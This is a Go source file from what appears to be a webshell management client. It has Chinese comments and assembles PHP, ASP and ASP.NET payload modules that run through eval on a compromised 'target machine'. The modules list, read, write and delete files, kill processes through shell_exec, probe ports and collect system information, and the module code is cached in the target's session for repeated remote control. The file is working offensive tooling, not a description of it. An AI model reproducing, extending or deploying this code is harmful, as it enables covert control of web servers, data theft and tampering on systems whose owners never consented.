package shell

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"sort"
	"strings"
)

// aspModPair 保存同一模块在 JScript 与 VBScript 两套引擎下的靶机源码。
type aspModPair struct {
	js  string
	vbs string
}

// fsPHP 是「文件管理」命名空间模块：把 list / read / write / delete 四个操作合并进
// 单一模块（会话键名 wsh_src_fs），经 wsh_mod('fs.<method>', argstr) 按方法名分发到
// wsh_fs_<method>()。模块源码只在首次（或会话失效）发送一次，之后每次只发极短的
// "fs.<method>" 调用；命中缓存时不再重发源码。
const fsPHP = `function wsh_fs_list(){global $wsh_args;$dir=$wsh_args['dir']??'';$dir=rtrim($dir,'/');if($dir===''){$dir='/';}$abs=is_dir($dir)?(@realpath($dir)?:$dir):$dir;$out=array('ok'=>true,'dir'=>$abs,'entries'=>array());if(!is_dir($abs)){$out['ok']=false;$out['error']='不是目录: '.$dir;}else{foreach(scandir($abs) as $n){if($n==='.'||$n==='..')continue;$p=$abs.'/'.$n;$out['entries'][]=array('name'=>$n,'path'=>$p,'isDir'=>is_dir($p),'size'=>is_file($p)?filesize($p):0,'mode'=>substr(sprintf('%o',fileperms($p)),-4));}}echo wsh_json($out);}` +
	`function wsh_fs_read(){global $wsh_args;$path=$wsh_args['path']??'';if(!is_file($path)){echo wsh_json(array('ok'=>false,'error'=>'不是文件: '.$path));}else{echo wsh_json(array('ok'=>true,'name'=>basename($path),'size'=>filesize($path),'base64'=>base64_encode(file_get_contents($path))));}}` +
	`function wsh_fs_write(){global $wsh_args;$path=$wsh_args['path']??'';$data=base64_decode($wsh_args['b64']??'');$b=@file_put_contents($path,$data);echo wsh_json($b===false?array('ok'=>false,'error'=>'写入失败'):array('ok'=>true,'bytes'=>$b));}` +
	`function wsh_fs_delete(){global $wsh_args;$path=$wsh_args['path']??'';$ok=is_dir($path)?@rmdir($path):@unlink($path);echo wsh_json($ok?array('ok'=>true):array('ok'=>false,'error'=>'删除失败'));}`

// prockillPHP 是"结束进程"操作的源码（原 prockill 模块），改造为 proc 命名空间下的
// wsh_proc_kill 方法。
const prockillPHP = `$pid=intval($wsh_args['pid']??0);$sig=intval($wsh_args['sig']??15);` +
	`if($pid<=0){echo wsh_json(array('ok'=>false,'error'=>'无效 PID'));return;}` +
	`$ok=false;$err='';if(function_exists('posix_kill')){$ok=@posix_kill($pid,$sig);if(!$ok)$err='posix_kill 失败（可能无权限）';}` +
	`elseif(function_exists('shell_exec')){$out=@shell_exec('kill -'.$sig.' '.$pid.' 2>&1');$ok=($out===null||trim($out)==='');if(!$ok)$err=trim($out)!==''?trim($out):'kill 执行失败';}` +
	`else{$err='环境不支持 posix_kill 或 shell_exec';}echo wsh_json(array('ok'=>$ok,'error'=>$err));`

// sysPHP 是"系统信息"命名空间模块：聚合 info / monitor / phpinfo 三个方法。
const sysPHP = `function wsh_sys_info(){global $wsh_args;` + osPHP + `}` +
	`function wsh_sys_monitor(){global $wsh_args;` + monitorPHP + `}` +
	`function wsh_sys_phpinfo(){global $wsh_args;` + phpInfoPHP + `}`

// procPHPNs 是"进程"命名空间模块：聚合 list / kill 两个方法。
const procPHPNs = `function wsh_proc_list(){global $wsh_args;` + procPHP + `}` +
	`function wsh_proc_kill(){global $wsh_args;` + prockillPHP + `}`

// netPHP 是"网络"命名空间模块：ports 方法（端口探测）。
const netPHP = `function wsh_net_ports(){global $wsh_args;` + portsPHP + `}`

// phpModules 是 PHP（eval / cmd）靶机的模块源码注册表，统一采用「命名空间」结构：
//   sys  → info / monitor / phpinfo
//   proc → list / kill
//   net  → ports
//   fs   → list / read / write / delete
// 模块源码由 bootstrap 的 wsh_mod 经 eval() 后，按 "命名空间.方法" 分发到 wsh_<ns>_<method>()。
var phpModules = map[string]string{
	"sys":  sysPHP,
	"proc": procPHPNs,
	"net":  netPHP,
	"fs":   fsPHP,
}

// aspModules 是 ASP 靶机的模块源码注册表（JScript / VBScript 各一套），统一采用
// 「命名空间.方法」结构（sys / proc / net / fs），由 bootstrap 的 wsh_mod 按点号分发到
// wsh_<ns>_<method>()。JScript 允许函数嵌套，可直接把脚本包进方法函数；VBScript 禁止过程
// 嵌套，故主逻辑包进 Sub、顶层 Function 助手（B64U16/SafeJson/CleanCtrl/PSR/EncB64 等）
// 保留为全局兄弟过程（wrapVbsNs / splitVbsMain 处理）。
var aspModules = func() map[string]aspModPair {
	// JScript 版：参数经全局 wsh_args 读取（如 wsh_args.dir）；函数可嵌套定义，直接包进方法函数。
	jsFsList := strings.ReplaceAll(aspFsList, "__DIR__", "wsh_args.dir")
	jsFsRead := strings.ReplaceAll(aspFsRead, "__PATH__", "wsh_args.path")
	jsFsWrite := strings.ReplaceAll(strings.ReplaceAll(aspFsWrite, "__PATH__", "wsh_args.path"), "__B64__", "wsh_args.b64")
	jsFsDelete := strings.ReplaceAll(aspFsDelete, "__PATH__", "wsh_args.path")
	jsFs := "function wsh_fs_list(){" + jsFsList + "}" +
		"function wsh_fs_read(){" + jsFsRead + "}" +
		"function wsh_fs_write(){" + jsFsWrite + "}" +
		"function wsh_fs_delete(){" + jsFsDelete + "}"

	jsProcKill := strings.ReplaceAll(aspProcKill, "__PID__", "wsh_args.pid")
	jsProcKill = strings.ReplaceAll(jsProcKill, "__SIG__", "wsh_args.sig")
	jsProcKill = strings.ReplaceAll(jsProcKill, "wsh_args.sig === 9", `wsh_args.sig === "9"`)
	jsSys := "function wsh_sys_monitor(){" + aspMonitor + "}" +
		"function wsh_sys_env(){" + aspEnv + "}"
	jsProc := "function wsh_proc_list(){" + aspProc + "}" +
		"function wsh_proc_kill(){" + jsProcKill + "}"
	jsNet := "function wsh_net_ports(){" + aspPorts + "}"

	// VBScript 版：cleanVbs 剥离非 ASCII；wrapVbsNs 把主逻辑包进 Sub、顶层 Function 助手留全局。
	// 参数不走 Session 信箱：wsh_mod 把 Scripting.Dictionary 经 Execute 直递 Sub 形参 wa，
	// 模板里 __DIR__/__PATH__ 等占位符替换为 wa("dir")/wa("path") 直接读参。
	vbsFsList := cleanVbs(strings.ReplaceAll(vbsFsList, "__DIR__", `wa("dir")`))
	vbsFsRead := cleanVbs(strings.ReplaceAll(vbsFsRead, "__PATH__", `wa("path")`))
	vbsFsWrite := cleanVbs(strings.ReplaceAll(strings.ReplaceAll(vbsFsWrite, "__PATH__", `wa("path")`), "__B64__", `wa("b64")`))
	vbsFsDelete := cleanVbs(strings.ReplaceAll(vbsFsDelete, "__PATH__", `wa("path")`))
	vbsFs := "Sub wsh_fs_list(wa)\n" + vbsFsList + "\nEnd Sub\n" +
		"Sub wsh_fs_read(wa)\n" + vbsFsRead + "\nEnd Sub\n" +
		"Sub wsh_fs_write(wa)\n" + vbsFsWrite + "\nEnd Sub\n" +
		"Sub wsh_fs_delete(wa)\n" + vbsFsDelete + "\nEnd Sub\n"
	vbsProcKill := cleanVbs(strings.ReplaceAll(strings.ReplaceAll(vbsProcKill, "__PID__", `wa("pid")`), "__SIG__", `wa("sig")`))
	vbsSys := wrapVbsNs([][2]string{{"sys_monitor", vbsMonitor}, {"sys_env", vbsEnv}})
	vbsProc := wrapVbsNs([][2]string{{"proc_list", vbsProc}, {"proc_kill", vbsProcKill}})
	vbsNet := wrapVbsNs([][2]string{{"net_ports", vbsPorts}})

	return map[string]aspModPair{
		"sys":  {jsSys, cleanVbs(vbsSys)},
		"proc": {jsProc, cleanVbs(vbsProc)},
		"net":  {jsNet, cleanVbs(vbsNet)},
		"fs":   {jsFs, cleanVbs(vbsFs)},
	}
}()

// splitVbsMain 把一段 VBS 脚本拆成 (主逻辑, 顶层助手)。脚本开头到第一个顶层 Function/Sub
// 定义之前为主逻辑；之后的顶层 Function/Sub 视为全局可复用的助手过程。VBScript 禁止过程
// 嵌套，故主逻辑会被包进 Sub wsh_<ns>_<method>，而助手必须留在全局作用域。
func splitVbsMain(src string) (body, helpers string) {
	re := regexp.MustCompile(`(?m)^[ \t]*(?:Function|Sub)[ \t]`)
	if loc := re.FindStringIndex(src); loc != nil {
		return strings.TrimRight(src[:loc[0]], " \t\r\n"), src[loc[0]:]
	}
	return src, ""
}

// wrapVbsNs 把若干 VBS 操作脚本组合成一个命名空间模块的源码：每个操作包进
// Sub wsh_<suffix>(wa)，所有顶层助手 Function 保留为全局兄弟过程（不嵌套）。
// wa 是 wsh_mod 经 Execute（调用方作用域）直递进来的 Scripting.Dictionary，
// 模块以 wa("key") 读参；不接参的模块也声明该形参（调用方统一传字典）。
func wrapVbsNs(methods [][2]string) string {
	out := ""
	helpers := ""
	for _, m := range methods {
		body, h := splitVbsMain(m[1])
		out += "Sub wsh_" + m[0] + "(wa)\n" + body + "\nEnd Sub\n"
		helpers += h
	}
	return out + helpers
}

// moduleSource 返回某连接类型下指定模块的靶机源码。
func moduleSource(t string, name string) (string, bool) {
	switch t {
	case TypeEval, TypeCmd:
		s, ok := phpModules[name]
		return s, ok
	case TypeAsp:
		m, ok := aspModules[name]
		if !ok {
			return "", false
		}
		return m.js, true
	case TypeAspVbs:
		m, ok := aspModules[name]
		if !ok {
			return "", false
		}
		return m.vbs, true
	case TypeAspnet:
		// aspnet 走服务端缓存：这里返回该命名空间可独立编译的 WshMod_<ns> 类源码，
		// CallModule 经 modStore 把源码存入 Application，之后每次只发极短的 wsh_mod 调用。
		return aspnetModuleSource(name), true
	}
	return "", false
}

// splitModule 把 "命名空间.方法" 形式的模块名拆成（命名空间, 方法）。
// 无点号时方法为空串（兼容 osinfo / monitor 等顶层脚本式模块）。
func splitModule(name string) (ns, method string) {
	if i := strings.Index(name, "."); i >= 0 {
		return name[:i], name[i+1:]
	}
	return name, ""
}

// moduleStatus 描述一次 moduleTry 的返回状态。
const (
	tryOK            = iota // 模块成功执行并返回 JSON
	tryMissing              // 靶机会话里没有该模块源码（MODULE_MISSING）
	tryHelpersMissing       // 公共助手 _hlp 尚未存入会话（HELPERS_MISSING）
	tryBootMissing          // 机件函数尚未存入会话（BOOT_MISSING）
)

// CallModule 以「会话模块」方式执行一次结构化能力：
//  1. 先发 wsh_mod(name, args) 尝试调用已在靶机会话里缓存的模块；
//  2. 若返回 HELPERS_MISSING（公共助手 _hlp 尚未缓存），则先 wsh_store 把助手源码
//     存进靶机会话，再重试 wsh_mod；
//  3. 若返回 MODULE_MISSING（模块首次或会话失效），则先 wsh_store 把模块源码存入，
//     再重试 wsh_mod。
//
// 模块源码与公共助手都只在首次（或会话失效后）各传输一次，之后每次只发极短的调用
// 指令（bootstrap 机件约 250 字节 + wsh_mod 调用），大幅降低重复发送大段模板带来的
// 带宽与时延。HELPERS_MISSING / MODULE_MISSING 两种缺失都会被自愈，无需在 Go 侧维护
// 靶机会话的「已存」状态。
func CallModule(ctx context.Context, o ExecOptions, s Shell, name string, args map[string]any) (map[string]any, error) {
	if s.Type() == TypeCmd {
		return nil, fmt.Errorf("该操作仅支持 php-eval 类型靶机")
	}
	// 模块名支持 "命名空间.方法"（如 fs.read）：按命名空间查源码、按命名空间缓存，
	// 由靶机侧 wsh_mod 解析点号并分发到 wsh_<ns>_<method>()。
	ns, _ := splitModule(name)
	src, ok := moduleSource(s.Type(), ns)
	if !ok {
		return nil, fmt.Errorf("未知模块: %s", ns)
	}
	argexpr := s.encodeArgs(args)
	base := s.bootstrap()
	call := s.modCall(name, argexpr)

	// 公共助手（wsh_exec / wsh_json / wsh_osname）以 _hlp 模块形式缓存；仅 php-eval 需要，
	// ASP 类靶机的助手由各自 bootstrap 内联，不走这条路径。
	helperSrc := ""
	hasHelper := false
	if s.Type() == TypeEval {
		helperSrc = wshHelpers + "\n" + wshOsName
		hasHelper = true
	}

	for i := 0; i < 4; i++ {
		m, st, err := moduleTry(ctx, o, s, base, call)
		if err != nil {
			return nil, err
		}
		switch st {
		case tryOK:
			return m, nil
		case tryHelpersMissing:
			if !hasHelper {
				return nil, fmt.Errorf("靶机缺少公共助手且未提供源码")
			}
			store := s.modStore("_hlp", helperSrc)
			if _, _, err := moduleTry(ctx, o, s, base, store); err != nil {
				return nil, err
			}
		case tryBootMissing:
			// 机件函数尚未写入靶机会话：一次性补装（自带 session_start，故前缀用空串）。
			if _, _, err := moduleTry(ctx, o, s, "", s.bootInstall()); err != nil {
				return nil, err
			}
		case tryMissing:
			store := s.modStore(ns, src)
			if _, _, err := moduleTry(ctx, o, s, base, store); err != nil {
				return nil, err
			}
		}
	}
	return nil, fmt.Errorf("模块调用失败（超过重试次数）: %s", name)
}

// moduleTry 发送一条 bootstrap+intent 组合，解析返回 JSON；状态见 moduleStatus。
func moduleTry(ctx context.Context, o ExecOptions, s Shell, boot, intent string) (m map[string]any, st int, err error) {
	payload, start, end := s.wrap(boot + "\n" + intent)
	res := send(ctx, o, payload, start, end)
	if !res.OK {
		return nil, 0, fmt.Errorf("%s", res.Error)
	}
	var out map[string]any
	if e := json.Unmarshal([]byte(res.Output), &out); e != nil {
		// 靶机回显若夹带脏字符（如 ASP/PHP 警告前缀、多出的标点），JSON 会解析失败。
		// 但只要其中含有模块协议的关键词，仍可据此走自愈分支，而不是直接报错。
		switch {
		case strings.Contains(res.Output, "MODULE_MISSING:"):
			return nil, tryMissing, nil
		case strings.Contains(res.Output, "HELPERS_MISSING"):
			return nil, tryHelpersMissing, nil
		case strings.Contains(res.Output, "BOOT_MISSING"):
			return nil, tryBootMissing, nil
		}
		msg := stripHTML(res.Output)
		if msg == "" {
			msg = "(空响应)"
		}
		return nil, 0, fmt.Errorf("靶机返回无法解析为 JSON: %s", msg)
	}
	if ok, _ := out["ok"].(bool); !ok {
		e, _ := out["error"].(string)
		switch {
		case strings.HasPrefix(e, "MODULE_MISSING:"):
			return nil, tryMissing, nil
		case strings.Contains(e, "HELPERS_MISSING"):
			return nil, tryHelpersMissing, nil
		case strings.Contains(e, "BOOT_MISSING"):
			return nil, tryBootMissing, nil
		default:
			return nil, 0, fmt.Errorf("%s", e)
		}
	}
	return out, tryOK, nil
}

// ClearModules 清空靶机会话中缓存的全部模块源码（清理落点：PHP 的 $_SESSION / ASP 的 Session）。
func ClearModules(ctx context.Context, o ExecOptions, s Shell) error {
	payload, start, end := s.wrap(s.bootstrap() + "\n" + s.clearCall())
	res := send(ctx, o, payload, start, end)
	if !res.OK {
		return fmt.Errorf("%s", res.Error)
	}
	var out map[string]any
	if err := json.Unmarshal([]byte(res.Output), &out); err != nil {
		return fmt.Errorf("清空模块缓存失败: %s", stripHTML(res.Output))
	}
	if ok, _ := out["ok"].(bool); !ok {
		return fmt.Errorf("清空模块缓存失败: %s", asStr(out["error"]))
	}
	return nil
}

// encodeArgsPacked 把 Go 侧参数表编码成靶机侧可拆分的键值串：
// 每个键值对为 key\x1f val（\x1f 分隔），对与对之间用 \x1e 分隔。
// \x1e/\x1f 为 C0 控制字符，不会出现在路径或 base64 中，故可安全用于分隔
// （同时避开 JSON，兼容不含原生 JSON 解析的 VBScript）。
// asp / asp.net 走此格式（经各自 Shell.encodeArgs）；php 已改用 array(...) 字面量，
// 见 phpShell.encodeArgs——真字典、无分隔符，值含控制字符也不会污染解析。
func encodeArgsPacked(args map[string]any) string {
	if len(args) == 0 {
		return ""
	}
	keys := make([]string, 0, len(args))
	for k := range args {
		keys = append(keys, k)
	}
	sort.Strings(keys) // 稳定顺序，便于调试（非必须）
	parts := make([]string, 0, len(keys))
	for _, k := range keys {
		parts = append(parts, k+"\x1f"+toStr(args[k]))
	}
	return strings.Join(parts, "\x1e")
}

// toStr 把参数值规整为字符串。
func toStr(v any) string {
	switch x := v.(type) {
	case string:
		return x
	case fmt.Stringer:
		return x.String()
	default:
		return fmt.Sprintf("%v", x)
	}
}
